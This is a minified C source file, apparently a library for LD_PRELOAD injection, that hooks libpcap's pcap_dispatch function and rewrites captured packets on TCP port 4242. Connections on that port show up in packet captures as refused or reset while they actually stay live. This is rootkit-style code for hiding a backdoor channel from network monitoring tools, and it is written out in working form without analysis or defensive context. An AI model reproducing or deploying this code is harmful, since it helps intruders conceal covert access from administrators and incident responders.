#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <pcap/pcap.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
static void(*original_callback)(u_char*,const struct pcap_pkthdr*,const u_char*)=NULL;static void swap16(__be16*a,__be16*b){__be16 c=*a;*a=*b;*b=c;}static void swap32(__be32*a,__be32*b){__be32 c=*a;*a=*b;*b=c;}static void pcap_dumper(u_char*user, const struct pcap_pkthdr*h, const u_char*bytes){struct ip*ip=(struct ip*)(bytes+14);int ipsize=(((ip)->ip_hl)&0x0f)*4;if(ipsize<20)return;if(ip->ip_p==IPPROTO_TCP){struct tcphdr*tcp=(struct tcphdr*)(bytes+14+ipsize);int tcpsize=tcp->doff*4;if(tcpsize<20)return;if(ntohs(tcp->dest)==4242){original_callback(user,h,bytes);swap16(&tcp->source,&tcp->dest);swap32(&tcp->seq,&tcp->ack_seq);}if(ntohs(tcp->source)==4242){tcp->fin=0;tcp->syn=0;tcp->rst=1;tcp->psh=0;tcp->ack=1;tcp->urg=0;tcp->ece=0;tcp->cwr=0;}original_callback(user,h,bytes);}}static int(*original_pcap_dispatch)(pcap_t*,int,pcap_handler,u_char*)=NULL;int pcap_dispatch(pcap_t*p, int cnt,pcap_handler callback,u_char*user){if(original_pcap_dispatch==NULL){original_pcap_dispatch=dlsym(RTLD_NEXT,"pcap_dispatch");if(original_pcap_dispatch==NULL)return -1;}original_callback=callback;return original_pcap_dispatch(p,cnt,pcap_dumper,user);}
